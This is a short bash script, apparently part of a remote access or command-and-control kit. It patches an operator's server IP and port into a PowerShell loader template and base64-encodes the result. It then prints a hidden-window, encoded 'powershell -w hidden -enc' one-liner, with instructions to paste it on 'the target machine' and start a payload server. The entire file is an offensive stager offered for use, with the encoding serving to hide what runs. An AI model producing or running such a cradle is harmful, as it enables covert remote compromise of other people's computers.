#!/bin/bash
# generates the ready-to-paste powershell one-liner
# usage: ./generate.sh <your-server-ip> [port]
#
# 1. build everything:    gradle :agent:build  (already done in CI/cloud)
# 2. generate one-liner:  ./generate.sh 1.2.3.4
# 3. start server:        cd server && python3 serve.py
# 4. paste the one-liner into powershell on the target machine

set -e

IP="${1:?usage: $0 <server-ip> [port]}"
PORT="${2:-8443}"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# read cradle template and patch IP/port
CRADLE=$(cat "$SCRIPT_DIR/loader/cradle.ps1")
CRADLE="${CRADLE/\$H=\"127.0.0.1\"/\$H=\"$IP\"}"
CRADLE="${CRADLE/\$P=8443/\$P=$PORT}"

# base64 encode (UTF-16LE for powershell -enc)
ENCODED=$(echo -n "$CRADLE" | iconv -f UTF-8 -t UTF-16LE | base64 -w0)

echo ""
echo "=== paste this into PowerShell (Run as User, NOT Admin) ==="
echo ""
echo "powershell -w hidden -enc $ENCODED"
echo ""
echo "=== server: cd server && python3 serve.py --port $PORT ==="
echo ""
